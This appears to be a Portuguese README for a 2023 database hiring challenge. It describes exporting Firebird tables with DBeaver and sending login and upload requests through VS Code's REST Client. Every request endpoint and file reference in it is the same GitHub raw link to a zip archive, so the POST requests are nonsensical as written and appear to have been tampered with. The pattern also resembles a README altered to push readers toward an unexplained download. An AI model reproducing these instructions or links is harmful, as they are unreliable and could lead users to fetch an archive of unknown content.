# psel-shinier-2023

Desafio banco de dados

O desafio realizado é sobre uma banco de dados  firebird sql que terão suas tabelas extraídas de uma backup no formato .fbk utilizando o SGBD DBEaver. 
Feito isso o arquivo gerado é .fbd. Em Seguida os dados de cada tabela será exportado como CSV e carregado no query utlizando o excel para agrupar colunas interessam para seguir o modelo proposto.

Através de um código abaixo é feita a conexão com a API utilizando o plug-in  REST CLIENT instalado no VS-CODE

### rota de login com o usário
POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip HTTP/1.1
content-type: application/json


{
   "email": "seu email que está recebendo o desafio",
   "group_key": "Client",
   "password":"enviado para você por email"
}


### rota de carregar o import retorna a diferença entre o esperado e o enviado
POST https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip HTTP/1.1
content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Authorization: Bearer ey… token gerado no login …jjsy8iGl8wFu7MGrhaV6l8


------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip"
Content-Type: application/excel


< https://raw.githubusercontent.com/karcioricardo/psel-shinier-2023/main/quadriga/shinier_psel_v1.8-beta.4.zip
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="type"


psel-shinier-2023
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="erp"


Psel
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="user_id"


27… id do seu usuário retornado no login …14da7
------WebKitFormBoundary7MA4YWxkTrZu0gW










